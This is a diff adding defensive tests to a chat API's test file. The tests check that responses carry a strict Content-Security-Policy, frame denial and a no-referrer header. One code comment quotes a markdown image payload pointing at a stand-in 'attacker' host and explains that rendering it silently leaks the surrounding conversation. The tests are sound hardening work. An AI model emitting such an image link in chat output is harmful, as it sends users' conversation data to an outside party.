@@ -203,3 +203,32 @@ describe("POST /api/chat with media", () => {
     expect(res.status).toBe(400);
   });
 });
+
+describe("security headers", () => {
+  it("sends a CSP that confines images to this origin", async () => {
+    // The other half of the sanitizer. `![](http://attacker/?q=…)` needs no
+    // JavaScript: rendering it is a silent outbound request that leaks the
+    // surrounding conversation, so no amount of script-blocking touches it.
+    const res = await app.fetch(new Request("http://t/api/health"));
+    const csp = res.headers.get("content-security-policy");
+    expect(csp).toContain("img-src 'self' data:");
+  });
+
+  it("does not permit inline scripts", async () => {
+    const res = await app.fetch(new Request("http://t/api/health"));
+    const csp = res.headers.get("content-security-policy") ?? "";
+    expect(csp).toContain("script-src 'self'");
+    expect(csp).not.toContain("script-src 'self' 'unsafe-inline'");
+  });
+
+  it("refuses to be framed", async () => {
+    const res = await app.fetch(new Request("http://t/api/health"));
+    expect(res.headers.get("content-security-policy")).toContain("frame-ancestors 'none'");
+    expect(res.headers.get("x-frame-options")).toBe("DENY");
+  });
+
+  it("sends no referrer", async () => {
+    const res = await app.fetch(new Request("http://t/api/health"));
+    expect(res.headers.get("referrer-policy")).toBe("no-referrer");
+  });
+});
